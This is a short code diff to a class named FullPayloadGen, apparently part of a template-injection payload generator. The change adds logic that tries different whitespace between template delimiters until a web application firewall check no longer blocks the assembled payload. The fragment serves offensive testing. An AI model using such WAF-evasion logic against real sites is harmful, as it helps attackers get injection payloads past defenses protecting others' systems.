@@ -451,8 +451,19 @@ class FullPayloadGen:
         context_payload = self.context_vars.get_payload(used_context)
 
         # 产生最终的payload
-        payload = context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)
-
+        # 防止waf ban掉 `}{` 等
+        payload = None
+        for whitespace in ["", " ", "\t", "\n"]:
+            if self.waf_func("%}" + whitespace + "{%"):
+                payload = whitespace.join(
+                    [
+                        *context_payload,
+                        self.outer_pattern.replace("PAYLOAD", inner_payload),
+                    ]
+                )
+                break
+        else:
+            return None
         self.callback(
             CALLBACK_GENERATE_FULLPAYLOAD,
             {
